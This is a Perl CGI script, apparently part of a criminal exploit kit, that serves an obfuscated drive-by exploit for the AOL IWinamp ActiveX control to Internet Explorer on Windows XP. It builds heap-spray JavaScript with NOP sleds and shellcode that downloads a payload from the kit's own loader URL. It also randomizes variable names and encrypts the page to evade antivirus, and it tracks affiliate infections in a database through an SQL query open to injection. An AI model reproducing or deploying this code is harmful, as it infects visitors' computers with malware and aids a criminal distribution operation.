#!/usr/bin/perl

#
# var randomizer for AOL IWinamp Activex exploit (Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0)
# FUD for all AV using random XOR + random Vars + Replace string of eval
#
#  NOT TESTED ...
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET aol_ampx=aol_ampx+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET aol_ampx=aol_ampx+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#randomize vars
$ampx         = JsXOR::generate_random_string(int(rand 100));
$j_shellcode  = JsXOR::generate_random_string(int(rand 100));
$j_nops       = JsXOR::generate_random_string(int(rand 100));
$j_headersize = JsXOR::generate_random_string(int(rand 100));
$j_slackspace = JsXOR::generate_random_string(int(rand 100));
$j_fillblock  = JsXOR::generate_random_string(int(rand 100));
$j_block      = JsXOR::generate_random_string(int(rand 100));
$j_memory     = JsXOR::generate_random_string(int(rand 100));
$j_counter    = JsXOR::generate_random_string(int(rand 30));
$j_ret        = JsXOR::generate_random_string(int(rand 100));
$j_eax        = JsXOR::generate_random_string(int(rand 100));
$j_bof        = JsXOR::generate_random_string(int(rand 100));

#exec code vars
$nops = '%u0c0c%u0c0c';
$ret = '%0c%0c%0c%0c';
$blocksize = 0x40000;
$fillto = 500;
$offset = 250;
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=aol_ampx';
$shellcode = Shellcode::getshell($urlllll);

#JAVASCRIPT DATA
my $data = <<EOF;

$j_shellcode=unescape('$shellcode');
$j_nops=unescape('$nops');
$j_headersize=20;
$j_slackspace=$j_headersize+$j_shellcode.length;
while($j_nops.length<$j_slackspace)$j_nops+=$j_nops;
$j_fillblock=$j_nops.substring(0,$j_slackspace);
$j_block=$j_nops.substring(0,$j_nops.length-$j_slackspace);
while($j_block.length+$j_slackspace<$blocksize)$j_block=$j_block+$j_block+$j_fillblock;
$j_memory=new Array();
for($j_counter=0;$j_counter<$fillto;$j_counter++)$j_memory\[$j_counter]=$j_block+$j_shellcode;
$j_eax='';
for($j_counter=0;$j_counter<=350;$j_counter++)$j_eax+=unescape('%FF%FF%FF%FF');
$j_ret='';
for($j_counter=0;$j_counter<=$offset;$j_counter++)$j_ret+=unescape('$ret');
$j_bof=$j_eax+$j_ret;
$ampx.ConvertFile($j_bof,1,1,1,1,1);
$ampx.ConvertFile($j_bof,1,1,1,1,1);
$ampx.ConvertFile($j_bof,1,1,1,1,1);
$ampx.ConvertFile($j_bof,1,1,1,1,1);

EOF


my $header = <<HEOF;

<html>
<OBJECT classid='clsid:FE0BD779-44EE-4A4B-AA2E-743C63F2E5E6' id='$ampx'></OBJECT>
<script language='javascript'>

HEOF

#$beforexoredd = JsXOR::excryptxorjs($data);
$beforexoredd = EncRand::CsCrypt($data,$csname,$theCookie);

###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print "$header";

print $beforexoredd;

print '</script></html>';

####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
